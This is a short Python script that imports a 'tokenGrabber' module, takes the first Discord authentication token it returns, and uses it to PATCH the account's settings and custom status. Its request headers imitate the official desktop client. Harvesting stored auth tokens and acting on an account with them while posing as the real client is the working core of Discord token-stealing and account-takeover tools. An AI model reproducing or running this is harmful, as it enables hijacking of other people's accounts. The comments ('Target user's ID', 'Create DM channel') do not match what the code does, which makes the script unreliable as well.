import tokenGrabber
import requests

tokens = tokenGrabber.getTokens()

TOKEN = tokens[0].get('token')

user_id = "1391826973432483931"  # Target user's ID

# 1. Create (or get) DM channel
dm_url = "https://discord.com/api/v8/users/@me/settings"
headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en-IN;q=0.9',
    'authorization': TOKEN,
    'content-type': 'application/json',
    'origin': 'https://discord.com',
    'priority': 'u=1, i',
    'referer': 'https://discord.com/channels/@me/1111607507417305140',
    'sec-ch-ua': '"Not:A-Brand";v="24", "Chromium";v="134"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9198 Chrome/134.0.6998.205 Electron/35.3.0 Safari/537.36',
    'x-context-properties': 'eyJsb2NhdGlvbiI6ImNoYXRfaW5wdXQifQ==',
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': 'en-US',
    'x-discord-timezone': 'America/Los_Angeles',
    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MTk4Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjYxMDAiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJoYXNfY2xpZW50X21vZHMiOmZhbHNlLCJjbGllbnRfbGF1bmNoX2lkIjoiNGE4YzAxZDItZWU3NC00YzkzLTgyN2YtZmU3ZjRlNTk5NTk0IiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8xLjAuOTE5OCBDaHJvbWUvMTM0LjAuNjk5OC4yMDUgRWxlY3Ryb24vMzUuMy4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIzNS4zLjAiLCJvc19zZGtfdmVyc2lvbiI6IjI2MTAwIiwiY2xpZW50X2J1aWxkX251bWJlciI6NDE2MzUxLCJuYXRpdmVfYnVpbGRfbnVtYmVyIjo2NTYyNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2hlYXJ0YmVhdF9zZXNzaW9uX2lkIjoiZmFiOGU5YWYtYTM5OS00MWQyLThiZWQtMjFjYzI5ZGIzMDg0IiwiY2xpZW50X2FwcF9zdGF0ZSI6ImZvY3VzZWQifQ==',
}
payload = {
    "status": "online",
    "custom_status": {
        "text": "test"
    }
}

res = requests.patch(dm_url, json=payload, headers=headers)
